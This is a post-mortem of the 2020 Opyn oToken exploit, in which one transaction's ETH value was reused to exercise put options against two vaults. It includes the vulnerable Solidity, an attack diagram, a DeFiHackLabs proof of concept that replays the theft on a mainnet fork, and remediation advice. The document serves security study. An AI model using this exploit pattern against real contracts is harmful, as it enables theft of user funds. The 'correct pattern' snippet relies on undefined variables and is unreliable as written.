# Opyn — Double Option Exercise with the Same ETH: Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2020-08-04 |
| **Protocol** | Opyn Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$371,260 (USDC) |
| **Attacker** | [0xe7870231992Ab4b1A01814FA0A599115FE94203f](https://etherscan.io/address/0xe7870231992Ab4b1A01814FA0A599115FE94203f) |
| **Attack Tx** | [0x56de6c4b...](https://etherscan.io/tx/0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a) |
| **Vulnerable Contract** | [0x951D51bAeFb72319d9FBE941E1615938d89ABfe2](https://etherscan.io/address/0x951D51bAeFb72319d9FBE941E1615938d89ABfe2) |
| **Root Cause** | The `exercise` function allowed options to be exercised against multiple vaults using the same `msg.value` (ETH) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-08/Opyn_exp.sol) |

---
## 1. Vulnerability Overview

Opyn is a decentralized options protocol that allows users to mint and exercise ETH put options (oTokens). When exercising an ETH put option, the user sends ETH and receives USDC. The vulnerability lay in the design of the `exercise` function, which iterated over multiple vault addresses supplied as an array using only a single `msg.value`. An attacker could "reuse" the same ETH against two different vaults, double-collecting USDC from each vault with no additional ETH.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable exercise function (pseudocode)
function exercise(
    uint256 oTokensToExercise,
    address payable[] calldata vaultsToExerciseFrom  // array of multiple vaults
) external payable {
    // ❌ Problem: msg.value remains the same throughout the entire function execution
    // The same ETH can be reused repeatedly across multiple vaults in the loop
    for (uint256 i = 0; i < vaultsToExerciseFrom.length; i++) {
        address payable vaultOwner = vaultsToExerciseFrom[i];

        // ❌ msg.value is not independently checked on each iteration
        // msg.value stays fixed at 30 ETH for the entire loop
        _exercise(oTokensToExercise / vaultsToExerciseFrom.length, vaultOwner);

        // _exercise receives ETH and pays out USDC internally
        // but does NOT verify that ETH is actually consumed on each iteration
    }
}

// ✅ Correct pattern
function exercise(uint256 oTokensToExercise, address payable[] calldata vaults) external payable {
    uint256 ethPerVault = msg.value / vaults.length;
    for (uint256 i = 0; i < vaults.length; i++) {
        // ✅ Validate the exact ETH proportion required per vault
        require(ethPerVault * oTokensToExercise / totalOTokens == requiredEth, "wrong ETH");
        _exercise(oTokensToExercise / vaults.length, vaults[i]);
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**oToken.sol** — Entry point:
```solidity
// ❌ Root cause: the `exercise` function allows options to be exercised against multiple vaults using the same `msg.value` (ETH)
    function exercise(  // ❌ Vulnerability
        uint256 oTokensToExercise,
        address payable[] memory vaultsToExerciseFrom
    ) public payable {
        for (uint256 i = 0; i < vaultsToExerciseFrom.length; i++) {
            address payable vaultOwner = vaultsToExerciseFrom[i];
            require(
                hasVault(vaultOwner),
                "Cannot exercise from a vault that doesn't exist"
            );
            Vault storage vault = vaults[vaultOwner];
            if (oTokensToExercise == 0) {
                return;
            } else if (vault.oTokensIssued >= oTokensToExercise) {
                _exercise(oTokensToExercise, vaultOwner);
                return;
            } else {
                oTokensToExercise = oTokensToExercise.sub(vault.oTokensIssued);
                _exercise(vault.oTokensIssued, vaultOwner);
            }
        }
        require(
            oTokensToExercise == 0,
            "Specified vaults have insufficient collateral"
        );
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (0xe787...)
    │
    ├─[1] Call addERC20CollateralOption
    │       amtToCreate = 300,000,000 (oETH put)
    │       amtCollateral = 9,900,000,000 USDC
    │       → Mint 300M option tokens (oTokens)
    │
    ├─[2] Call exercise (msg.value = 30 ETH)
    │       oTokensToExercise = 600,000,000
    │       vaults = [vault_A, vault_B]  ← two vaults
    │
    │       Internal loop:
    │       ┌─ i=0: Exercise 300M oTokens from vault_A
    │       │       Send 30 ETH → Receive USDC   ✓
    │       │
    │       └─ i=1: Exercise 300M oTokens from vault_B
    │               ❌ Same 30 ETH msg.value reused!
    │               → Receive additional USDC (with no ETH)
    │
    ├─[3] Call removeUnderlying
    │       Withdraw remaining ETH/USDC after exercise
    │
    └─[4] Net profit: Receive USDC equivalent to 60 ETH by sending only 30 ETH
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    IOpyn opyn    = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2); // Vulnerable oToken contract
    address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;
    IUSDC usdc    = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        cheats.createSelectFork("mainnet", 10_592_516);
    }

    function test_attack() public {
        cheats.startPrank(attacker);

        uint256 balBefore = usdc.balanceOf(attacker) / 1e6;
        console.log("USDC balance before attack:", balBefore);

        // [Step 1] Deposit collateral (USDC) and mint oTokens
        uint256 amtToCreate   = 300_000_000;    // Number of oTokens to mint
        uint256 amtCollateral = 9_900_000_000;  // USDC to deposit as collateral
        opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);

        // [Step 2] Double-exercise against two vaults using the same ETH
        address payable[] memory vaults = new address payable[](2);
        vaults[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f); // vault A
        vaults[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2); // vault B

        // ⚡ Key: send 30 ETH but receive USDC worth 30 ETH from each of the two vaults
        // msg.value = 30 ETH, total oTokens exercised = 600M (combined across both vaults)
        opyn.exercise{value: 30 ether}(600_000_000, vaults);

        // [Step 3] Withdraw remaining collateral
        opyn.removeUnderlying();

        uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
        console.log("USDC balance after attack:", balAfter);
        console.log("Profit (USDC):", balAfter - balBefore);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Payment Logic Flaw |
| **Sub-type** | msg.value Reuse in Loop |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Complexity** | Low (single transaction) |
| **Preconditions** | Put option contract, multi-vault exercise capability |
| **Impact** | Theft of USDC collateral held in the contract |

---
## 6. Remediation Recommendations

1. **Split and validate msg.value within the loop**: When iterating over multiple targets, explicitly track and verify the ETH consumed on each iteration.
2. **Pre-calculate the total amount**: Before the loop, compute the total ETH required and assert `msg.value == totalRequired`.
3. **Internal accounting**: Do not rely on `address(this).balance`; track ETH balances using a dedicated internal variable.
4. **Restrict exercise to a single vault**: Simplify the design so that only one vault can be exercised per transaction.

---
## 7. Lessons Learned

- **The special nature of msg.value**: `msg.value` is set only once per transaction and does not decrease when reused inside a loop. Any logic that distributes ETH to multiple recipients must account for this characteristic.
- **Danger of array inputs**: When a function accepts an array and iterates over it, the independence of each iteration — especially regarding payment — must be strictly enforced.
- **Complexity of options protocol design**: Derivative protocols involve tightly coupled payment, collateral, and exercise logic, making careful design and multiple independent audits especially critical.